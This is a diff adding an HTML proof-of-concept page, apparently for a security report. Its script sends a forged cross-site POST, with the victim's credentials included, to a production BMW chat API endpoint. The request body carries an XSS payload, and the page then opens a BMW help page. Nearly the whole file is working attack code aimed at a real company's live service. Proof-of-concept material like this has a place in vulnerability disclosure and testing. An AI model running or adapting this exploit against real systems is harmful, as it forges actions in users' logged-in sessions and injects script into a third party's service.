@@ -1,0 +1,33 @@
+<html>
+  <body>
+    <h1>CSRF PoC Loading...</h1>  <!-- Visible text to confirm page loads -->
+    <script>
+      console.log('Script starting...');  // Check console for this
+      alert('PoC executing! Check Network tab for request.');
+
+      const payload = '<img src=x onerror=alert(1)>';
+      const jsonBody = `{"message":"${payload}"}`;
+
+      fetch('https://crm-il-api-prod.bmwgroup.com/ckm-genai-chat-prod-api/api/v1/message', {
+        method: 'POST',
+        mode: 'no-cors',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'text/plain'
+        },
+        body: jsonBody
+      }).then(() => {
+        console.log('Fetch succeeded!');
+        alert('Message sent! Opening BMW page...');
+      }).catch(error => {
+        console.error('Fetch error:', error);
+        alert('Error sending message: ' + error.message);
+      });
+
+      setTimeout(() => {
+        console.log('Opening window...');
+        window.open('https://www.bmw.de/de/topics/service-und-zubehoer/hilfe-kontakt.html', '_blank');
+      }, 1000);
+    </script>
+  </body>
+</html>
